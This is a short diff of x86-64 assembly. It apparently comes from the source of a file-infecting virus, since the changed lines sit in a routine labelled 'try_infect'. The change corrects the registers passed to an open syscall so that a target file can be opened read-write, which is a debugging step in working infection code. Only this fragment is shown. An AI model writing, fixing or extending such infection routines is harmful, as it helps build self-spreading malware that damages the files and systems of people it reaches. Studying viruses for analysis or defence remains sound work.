@@ -273,7 +273,8 @@ try_infect:
     syscall
     pop rdi
 
-    mov rdi, O_RDWR
+    mov rsi, O_RDWR
+    xor rdx, rdx
     mov rax, SYS_OPEN
     syscall
     test rax, rax
